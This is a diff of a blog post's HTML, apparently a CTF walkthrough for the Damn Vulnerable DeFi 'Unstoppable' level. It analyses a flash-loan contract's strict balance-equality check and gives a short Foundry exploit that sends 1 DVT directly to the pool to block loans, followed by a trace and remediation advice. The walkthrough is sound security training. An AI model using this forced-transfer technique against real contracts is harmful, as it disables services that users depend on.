@@ -9,22 +9,19 @@
 
 
 <meta name="author" content="Vasiliy Yorkin">
-<meta name="description" content=" Intro There are only 16 days left to prepare for the Paradigm CTF 2022. Hence I&rsquo;m going to spend this time solving the Damn Vulnerable DeFi challenges and then concentrate on playing the Paradigm CTF 2021.
-Challenge Thoughts Exploit Conclusion References SWC-132 &ndash; Unexpected Ether balance (from the Smart Contract Weakness Classification and Test Cases). ">
+<meta name="description" content="There are only a few days left to prepare for the Paradigm CTF 2022. Hence I&rsquo;m going to spend this time solving the Damn Vulnerable DeFi challenges and then concentrate on playing the Paradigm CTF 2021. Intro Damn Vulnerable DeFi is a CTF that simulates DeFi vulnerabilities created by @tinchoabbate. This game has 13 different levels featuring popular DeFi primitives such as lash loans, price oracles, governance, lending pools, integrations with Uniswap v2, Gnosis Safe wallets, timelocks, NFTs, upgradeability patterns and more.">
 <meta name="keywords" content="Vasiliy Yorkin">
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="CTF walkthrough, Damn Vulnerable DeFi, #1 Unstoppable"/>
-<meta name="twitter:description" content=" Intro There are only 16 days left to prepare for the Paradigm CTF 2022. Hence I&rsquo;m going to spend this time solving the Damn Vulnerable DeFi challenges and then concentrate on playing the Paradigm CTF 2021.
-Challenge Thoughts Exploit Conclusion References SWC-132 &ndash; Unexpected Ether balance (from the Smart Contract Weakness Classification and Test Cases). "/>
+<meta name="twitter:description" content="There are only a few days left to prepare for the Paradigm CTF 2022. Hence I&rsquo;m going to spend this time solving the Damn Vulnerable DeFi challenges and then concentrate on playing the Paradigm CTF 2021. Intro Damn Vulnerable DeFi is a CTF that simulates DeFi vulnerabilities created by @tinchoabbate. This game has 13 different levels featuring popular DeFi primitives such as lash loans, price oracles, governance, lending pools, integrations with Uniswap v2, Gnosis Safe wallets, timelocks, NFTs, upgradeability patterns and more."/>
 
 <meta property="og:title" content="CTF walkthrough, Damn Vulnerable DeFi, #1 Unstoppable" />
-<meta property="og:description" content=" Intro There are only 16 days left to prepare for the Paradigm CTF 2022. Hence I&rsquo;m going to spend this time solving the Damn Vulnerable DeFi challenges and then concentrate on playing the Paradigm CTF 2021.
-Challenge Thoughts Exploit Conclusion References SWC-132 &ndash; Unexpected Ether balance (from the Smart Contract Weakness Classification and Test Cases). " />
+<meta property="og:description" content="There are only a few days left to prepare for the Paradigm CTF 2022. Hence I&rsquo;m going to spend this time solving the Damn Vulnerable DeFi challenges and then concentrate on playing the Paradigm CTF 2021. Intro Damn Vulnerable DeFi is a CTF that simulates DeFi vulnerabilities created by @tinchoabbate. This game has 13 different levels featuring popular DeFi primitives such as lash loans, price oracles, governance, lending pools, integrations with Uniswap v2, Gnosis Safe wallets, timelocks, NFTs, upgradeability patterns and more." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-1-unstoppable/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2022-08-04T15:07:00+03:00" />
-<meta property="article:modified_time" content="2022-08-04T15:07:00+03:00" />
+<meta property="article:published_time" content="2022-08-09T20:03:00+03:00" />
+<meta property="article:modified_time" content="2022-08-09T20:03:00+03:00" />
 
 
 
@@ -40,7 +37,7 @@ Challenge Thoughts Exploit Conclusion References SWC-132 &ndash; Unexpected Ethe
 
   
   
-  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.f457e937e31d731408def5c4e09a8bc48156362889abb942912d05a8243264a6.css" integrity="sha256-9FfpN&#43;MdcxQI3vXE4JqLxIFWNiiJq7lCkS0FqCQyZKY=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.bce1ad3fd9463aca56f0ae393ff86fb2a0d51b58b56e32625fa4af028409f02d.css" integrity="sha256-vOGtP9lGOspW8K45P/hvsqDVG1i1bjJiX6SvAoQJ8C0=" crossorigin="anonymous" media="screen" />
 
 
 
@@ -50,7 +47,7 @@ Challenge Thoughts Exploit Conclusion References SWC-132 &ndash; Unexpected Ethe
   
     
     
-    <link rel="stylesheet" href="https://vyorkin.org/css/coder-dark.min.58002408d8b6590c4b5ea8cc6e50bb088510809eae7e48d72d44762e7e7481af.css" integrity="sha256-WAAkCNi2WQxLXqjMblC7CIUQgJ6ufkjXLUR2Ln50ga8=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="https://vyorkin.org/css/coder-dark.min.e2e6584ce20683687b57e321b1116fbb5051e3534cc7846c9baccff833431b67.css" integrity="sha256-4uZYTOIGg2h7V&#43;MhsRFvu1BR41NMx4Rsm6zP&#43;DNDG2c=" crossorigin="anonymous" media="screen" />
   
 
 
@@ -165,8 +162,8 @@ Challenge Thoughts Exploit Conclusion References SWC-132 &ndash; Unexpected Ethe
           <div class="date">
             <span class="posted-on">
               <i class="fa fa-calendar" aria-hidden="true"></i>
-              <time datetime="2022-08-04T15:07:00&#43;03:00">
-                August 4, 2022
+              <time datetime="2022-08-09T20:03:00&#43;03:00">
+                August 9, 2022
               </time>
             </span>
           </div>
@@ -196,58 +193,195 @@ Challenge Thoughts Exploit Conclusion References SWC-132 &ndash; Unexpected Ethe
 
       <div>
         
-        <h2 id="intro">
-  Intro
-  <a class="heading-link" href="#intro">
-    <i class="fa fa-link" aria-hidden="true"></i>
-  </a>
-</h2>
-<figure><img src="https://vyorkin.org/ox-hugo/paradigm-ctf-2022-16-days.jpg"/>
-</figure>
-
-<p>There are only 16 days left to prepare for the
+        <blockquote class="quote2 quote2-note no-quote">There are only a few days left to prepare for the
 <a href="https://ctf.paradigm.xyz/">Paradigm CTF 2022</a>. Hence I&rsquo;m
 going to spend this time solving the
 <a href="https://www.damnvulnerabledefi.xyz/">Damn Vulnerable DeFi</a>
 challenges and then concentrate on playing the
 <a href="https://github.com/paradigmxyz/paradigm-ctf-2021">Paradigm CTF
-2021</a>.</p>
+2021</a>.
+</blockquote>
+
+<h2 id="intro">
+  Intro
+  <a class="heading-link" href="#intro">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p><a href="https://www.damnvulnerabledefi.xyz/">Damn Vulnerable DeFi</a> is
+a CTF that simulates DeFi vulnerabilities created by
+<a href="https://twitter.com/tinchoabbate">@tinchoabbate</a>. This game
+has 13 different levels featuring popular DeFi primitives such
+as lash loans, price oracles, governance, lending pools,
+integrations with Uniswap v2, Gnosis Safe wallets, timelocks,
+NFTs, upgradeability patterns and more. It is fun and enojoyable
+way to learn DeFi-related offensive security. Needless to say it
+requires some level of understanding of high level concepts
+behind those DeFi protocols.</p>
+<h2 id="setup">
+  Setup
+  <a class="heading-link" href="#setup">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p><a href="https://github.com/tinchoabbate/damn-vulnerable-defi">Here</a>
+is the original refactored game repo that uses
+<a href="https://hardhat.org/">hardhat</a> +
+<a href="https://docs.ethers.io/v5/single-page/">ethers</a>, but I&rsquo;m
+going to play using the
+<a href="https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry">foundry
+version</a> of it.</p>
 <h2 id="challenge">
   Challenge
   <a class="heading-link" href="#challenge">
     <i class="fa fa-link" aria-hidden="true"></i>
   </a>
 </h2>
-<h2 id="thoughts">
-  Thoughts
-  <a class="heading-link" href="#thoughts">
+<ul>
+<li>The <code>UnstoppableLender</code> contract offers flash loans in DVT
+(ERC20) tokens for free.</li>
+<li>It has 1000000 DVT in balance.</li>
+<li>We must solve this challenge by disabling functionaly of this
+contract &ndash; stop the poll from offering flash loans.</li>
+<li>We start with 100 DVT tokens in balance.</li>
+</ul>
+<h2 id="analysis">
+  Analysis
+  <a class="heading-link" href="#analysis">
     <i class="fa fa-link" aria-hidden="true"></i>
   </a>
 </h2>
+<p>The <code>UnstoppableLender</code> inherits from the
+<a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard">ReentrancyGuard</a>
+and each <code>external</code> function has the <code>nonReentrant</code> modifier.
+Let&rsquo;s have a look at contract&rsquo;s state variables:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>IERC20 <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">immutable</span> damnValuableToken;
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">public</span> poolBalance;
+</span></span></code></pre></div><ul>
+<li><code>damnValuableToken</code> is DVT ERC20 token.</li>
+<li><code>poolBalance</code> is used for accounting and stores the sum of all deposits.</li>
+</ul>
+<p>Now, let&rsquo;s go over external functions:</p>
+<p><strong>depositTokens</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> depositTokens(<span style="color:#fff;font-weight:bold">uint256</span> amount) <span style="color:#fff;font-weight:bold">external</span> nonReentrant {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (amount == <span style="color:#ff0;font-weight:bold">0</span>) <span style="color:#fff;font-weight:bold">revert</span> MustDepositOneTokenMinimum();
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// Transfer token from sender. Sender must have first approved them.
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    damnValuableToken.transferFrom(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>, <span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>), amount);
+</span></span><span style="display:flex; background-color:#191919"><span>    poolBalance = poolBalance + amount;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>It requires the deposit of at least 1 DVT.</li>
+<li>Assumes that the <code>msg.sender</code> have <code>approve</code>&rsquo;d the <code>amount</code>.</li>
+<li>Updates the <code>poolBalance</code> so it reflects the total amount of
+DVT&rsquo;s in a pool.</li>
+</ul>
+<p>For some reason this contract keeps track of its DVT balance in
+the <code>poolBalance</code> storage variable instead of relying on the
+<code>dvt.balanceOf</code> function. Let&rsquo;s keep this in mind.</p>
+<p><strong>flashLoan</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#fff;font-weight:bold">function</span> flashLoan(<span style="color:#fff;font-weight:bold">uint256</span> borrowAmount) <span style="color:#fff;font-weight:bold">external</span> nonReentrant {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (borrowAmount == <span style="color:#ff0;font-weight:bold">0</span>) <span style="color:#fff;font-weight:bold">revert</span> MustBorrowOneTokenMinimum();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> balanceBefore = damnValuableToken.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (balanceBefore &lt; borrowAmount) <span style="color:#fff;font-weight:bold">revert</span> NotEnoughTokensInPool();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// Ensured by the protocol via the `depositTokens` function
+</span></span></span><span style="display:flex; background-color:#191919"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">if</span> (poolBalance != balanceBefore) <span style="color:#fff;font-weight:bold">revert</span> AssertionViolated();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    damnValuableToken.<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>, borrowAmount);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    IReceiver(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>).receiveTokens(
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">address</span>(damnValuableToken),
+</span></span><span style="display:flex;"><span>        borrowAmount
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> balanceAfter = damnValuableToken.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (balanceAfter &lt; balanceBefore) <span style="color:#fff;font-weight:bold">revert</span> FlashLoanHasNotBeenPaidBack();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>👀 The problem is this line:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">if</span> (poolBalance != balanceBefore) <span style="color:#fff;font-weight:bold">revert</span> AssertionViolated();
+</span></span></code></pre></div><p>It is possible to transfer ERC20 tokens to any EOA/contract.
+Hence we can directly send some DVT&rsquo;s to the <code>UnstoppableLender</code>
+(without calling the <code>depositTokens</code> function) and break the
+equality check above.</p>
 <h2 id="exploit">
   Exploit
   <a class="heading-link" href="#exploit">
     <i class="fa fa-link" aria-hidden="true"></i>
   </a>
 </h2>
+<p>Sending just 1 DVT is enough:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> testExploit() <span style="color:#fff;font-weight:bold">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT START **/</span>
+</span></span><span style="display:flex;"><span>    vm.prank(attacker);
+</span></span><span style="display:flex;"><span>    dvt.<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">address</span>(unstoppableLender), <span style="color:#ff0;font-weight:bold">1</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT END **/</span>
+</span></span><span style="display:flex;"><span>    vm.expectRevert(UnstoppableLender.AssertionViolated.<span style="color:#fff;font-weight:bold">selector</span>);
+</span></span><span style="display:flex;"><span>    validation();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Here is the trace:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#fff;font-weight:bold">test</span> --match-contract Unstoppable -vvvv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Running <span style="color:#ff0;font-weight:bold">1</span> <span style="color:#fff;font-weight:bold">test</span> <span style="color:#fff;font-weight:bold">for</span> src/test/Levels/unstoppable/Unstoppable.t.sol:Unstoppable
+</span></span><span style="display:flex;"><span>[PASS] testExploit() (gas: 44892)
+</span></span><span style="display:flex;"><span>Logs:
+</span></span><span style="display:flex;"><span>  🧨 PREPARED TO BREAK THINGS 🧨
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Traces:
+</span></span><span style="display:flex;"><span>  [44892] Unstoppable::testExploit()
+</span></span><span style="display:flex;"><span>    ├─ [0] VM::prank(Attacker: [0x9af2e2b7e57c1cd7c68c5c3796d8ea67e0018db7])
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [12870] DVT::transfer(Unstoppable Lender: [...], 1)
+</span></span><span style="display:flex;"><span>    │   ├─ emit Transfer(from: Attacker: [...], to: Unstoppable Lender: [...], value: 1)
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
+</span></span><span style="display:flex;"><span>    ├─ [0] VM::expectRevert(AssertionViolated())
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [0] VM::startPrank(User: [...])
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    ├─ [11550] Receiver Unstoppable::executeFlashLoan(10)
+</span></span><span style="display:flex;"><span>    │   ├─ [8416] Unstoppable Lender::flashLoan(10)
+</span></span><span style="display:flex;"><span>    │   │   ├─ [562] DVT::balanceOf(Unstoppable Lender: [...]) [staticcall]
+</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#ff0;font-weight:bold">1000000000000000000000001</span>
+</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#0ff;font-weight:bold">&#34;AssertionViolated()&#34;</span>
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#0ff;font-weight:bold">&#34;AssertionViolated()&#34;</span>
+</span></span><span style="display:flex;"><span>    ├─ [0] VM::stopPrank()
+</span></span><span style="display:flex;"><span>    │   └─ ← ()
+</span></span><span style="display:flex;"><span>    └─ ← ()
+</span></span></code></pre></div><h2 id="remediation">
+  Remediation
+  <a class="heading-link" href="#remediation">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<ul>
+<li>Remove the strict equality check or replace it with inequality.</li>
+<li>Get rid of <code>poolBalance</code> and don&rsquo;t track the pool&rsquo;s balance.</li>
+</ul>
 <h2 id="conclusion">
   Conclusion
   <a class="heading-link" href="#conclusion">
     <i class="fa fa-link" aria-hidden="true"></i>
   </a>
 </h2>
+<p>Don&rsquo;t rely on your own accounting. The assumption that you can
+control contract&rsquo;s balance is wrong.</p>
 <h2 id="references">
   References
   <a class="heading-link" href="#references">
     <i class="fa fa-link" aria-hidden="true"></i>
   </a>
 </h2>
-<ul>
-<li><a href="https://swcregistry.io/docs/SWC-132">SWC-132</a> &ndash; Unexpected
+<p>This SWC is related to forcible sending Ether
+(instead of an ERC20 token), but the main idea is the same:
+<a href="https://swcregistry.io/docs/SWC-132">SWC-132</a> &ndash; Unexpected
 Ether balance (from the Smart Contract Weakness Classification
-and Test Cases).</li>
-</ul>
+and Test Cases).</p>
 <hr>
+<p>Thanks for reading!
+<a href="https://github.com/vyorkin/damn-vulnerable-defi-solutions/blob/master/src/test/Levels/unstoppable/Unstoppable.t.sol#L65">Here</a>
+is the test code with the solution. The next one is
+<a href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-2-naive-receiver">#2
+Naive Receiver</a>.</p>
 
         
       </div>
